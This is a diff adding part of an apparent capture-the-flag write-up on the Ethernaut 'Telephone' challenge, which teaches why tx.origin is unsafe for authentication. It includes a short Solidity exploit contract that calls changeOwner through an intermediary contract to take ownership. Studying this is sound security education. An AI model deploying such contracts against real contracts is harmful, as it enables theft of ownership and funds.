@@ -39,4 +39,24 @@ EOAs satisfy the following conditions:
 
 This challenge requires us to make a Phishing Attack on this contract and teach us why one shouldn't use tx.origin to authenticate an account to execute a function.
 
+The following is the code that I used on Remix IDE and injected onto the Telephone.sol contract in order to conduct a Phishing Attack.
 
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import './Telephone.sol';
+
+contract TelephonePhishing {
+
+    Telephone telephoneContract;
+
+    constructor(address _addr) public{
+        telephoneContract = Telephone(_addr);
+    }
+
+    function phish(address _addr) public{
+        telephoneContract.changeOwner(_addr);
+    }
+    
+}```
